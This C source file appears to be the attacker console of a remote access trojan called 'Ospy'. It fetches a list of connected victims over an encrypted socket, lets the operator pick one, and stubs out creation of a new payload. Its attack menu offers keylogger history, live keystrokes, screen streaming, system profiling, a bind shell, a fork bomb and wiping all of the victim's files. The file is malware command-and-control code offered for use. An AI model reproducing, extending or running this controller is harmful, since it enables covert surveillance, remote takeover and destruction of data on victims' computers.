#include "attack_mode.h"
#include "connection.h"
#include "utilities.h"
#include <stdbool.h>

main_data data;

int * active_victims;
char ** name_of_connected_victim;

char connected_victims[MAX_VICTIMS_PER_ATTACKER][MAX_USER_NAME_LEN];

bool valid_victim_name (char * victim_name){
	for (int i = 0; i < strlen(victim_name); i++){
		if (!((victim_name[i] >= 'a' && victim_name[i] <= 'z') || (victim_name[i] >= 'A' && victim_name[i] <= 'Z') || victim_name[i] == '_' || (victim_name[i] >= '0' && victim_name[i] <= '9')))
			return FALSE;
	}
	return TRUE;
}

void create_new_payload(){
	char victim_name[MAX_INPUT_LEN];
	
	do {
		print_small_banner();
		printf("\n[✚] create new payload ....\n");
		printf("    Enter vicim name : ");
		safe_scan(&victim_name, MAX_INPUT_LEN);
		if (valid_victim_name(victim_name))
			break;
		else {
			printf("\n[-] \033[31;1mInvalid input, victim name may include 'a'-'z', 'A'-'Z', '_' only\033[0m\n");
			press_enter_to_continue();
		} 		
	} while (1);
	
}

void choose_attack_menu (){
	print_small_banner();
	printf("\033[4;37mChoose action :\033[0m\n\n");
	printf("[1] \033[96mGet %s's keylogger history file\033[0m\n", selected_victim_name);
	printf("[2] \033[96mGet %s's live keystrokes\033[0m\n", selected_victim_name);
	printf("[3] \033[96mGet %s's screen stream\033[0m\n", selected_victim_name);
	printf("[4] \033[96mGet %s's system profiler file\033[0m\n", selected_victim_name);
	printf("[5] \033[96mSend %s's computer command (bind shell)\033[0m\n", selected_victim_name);
	printf("[6] \033[96mStuck %s's computer (Fork boom)\033[0m\n", selected_victim_name);
	printf("[7] \033[96mDelete %s's all files\033[0m\n", selected_victim_name);
	printf("[8] \033[96mSelect other victim\033[0m\n");
	printf("[9] \033[96mExit Ospy\033[0m\n\n");
}

//void print_all_connected_victims(){
//	print_small_banner();
//	A_S_message_handler(data, GET_CONNECTED_VICTM);
//	num_of_connected_victims = 0;
//	name_of_connected_victim = (char **) malloc(sizeof(char *));
//	active_victims = (int *) malloc(sizeof(int));
//	printf("\033[4;37m\033[1m\033[37mSelect victim or other option - \033[0m\n");
//	printf("\n  \033[4;37mConnected victims list : \033[0m\n");
//	while (recv(attacker_socket, &connected_victims, sizeof(connected_victims_protocol), 0) > 0){
//		if (strcmp(connected_victims.victim_name, "") != 0){
//			name_of_connected_victim = (char **) realloc(name_of_connected_victim, ++num_of_connected_victims * sizeof(char *));
//			name_of_connected_victim[num_of_connected_victims-1] = (char *) malloc(MAX_INPUT_LEN * sizeof(char));
//			active_victims = (int *) realloc(active_victims, num_of_connected_victims * sizeof(int));
//			active_victims[num_of_connected_victims-1] = 1;
//			strcpy(name_of_connected_victim[num_of_connected_victims-1],connected_victims.victim_name);
//			printf("    [%d] %s\n",num_of_connected_victims, connected_victims.victim_name);
//			fflush(stdout);
//		}
//		if(connected_victims.end_of_connected_victims == 1){
//			break;
//		}
//	}
//	printf("\n  \033[4;37mOther options - \033[0m\n");
//	printf("    [A] Add new victim\n");
//	printf("    [R] Reload connected victims list\n");
//	printf("    [E] Exit Ospy\n");
//}

void print_all_connected_victims(){
	print_small_banner();
	A_2_S_encrypted_message_handler(data, GET_CONNECTED_VICTM);
	printf("\033[4;37m\033[1m\033[37mSelect victim or other option - \033[0m\n");
	printf("\n  \033[4;37mConnected victims list : \033[0m\n");
	recv(attacker_socket, &connected_victims, sizeof(connected_victims), 0);
	for(int i = 0; i < MAX_VICTIMS_PER_ATTACKER; i++){
		if (strcmp(connected_victims[i], "") != 0)
			printf("    [%d] %s\n", i, connected_victims[i]);
		fflush(stdout);
	}		
	printf("\n  \033[4;37mOther options - \033[0m\n");
	printf("    [A] Add new victim\n");
	printf("    [R] Reload connected victims list\n");
	printf("    [E] Exit Ospy\n");
}

void choose_victim (){
	int attacker_selection;
	while (true) {
		print_all_connected_victims();
		
		printf("\n\033[35;1m-> \033[0m");
		flush_stdin();
		attacker_selection = getchar();
		
		if (attacker_selection == 'A' || attacker_selection == 'a' || attacker_selection == 'R' || attacker_selection == 'r' || attacker_selection == 'E' || attacker_selection == 'e')
			break;
			
		if (attacker_selection < '0' || attacker_selection > '9'){
			printf("\n[-] \033[31;1mInvalid input, try again...\033[0m\n");
			sleep(2);
			continue;
		}
		if (strcmp(connected_victims[attacker_selection - '0'], "") != 0)
			break;
			
		printf("\n[-] \033[31;1mNo such victim, try again...\033[0m\n");
		sleep(2);
	}
	
	if (attacker_selection == 'R' || attacker_selection == 'r'){
		printf("\n[⧖] Reloading....\n");
		sleep(1);
		choose_victim();
	}
	else if (attacker_selection == 'A' || attacker_selection == 'a'){
		//printf("\ncreate new payload ....\n");
		create_new_payload();
		sleep(2);
		exit(1);
	}
	else if (attacker_selection == 'E' || attacker_selection == 'e'){
		exit(1);
	}
	else {
		#ifdef USER_MESSAGE_PROMPT
		connecting_load();
		#endif
		
		strcpy(data.selected_victim_name, connected_victims[attacker_selection - '0']);
		strcpy(selected_victim_name, connected_victims[attacker_selection - '0']); // for later use
		A_2_S_encrypted_message_handler(data, SELECT_VICTIM);
		//free(active_victims);
	}	
	
}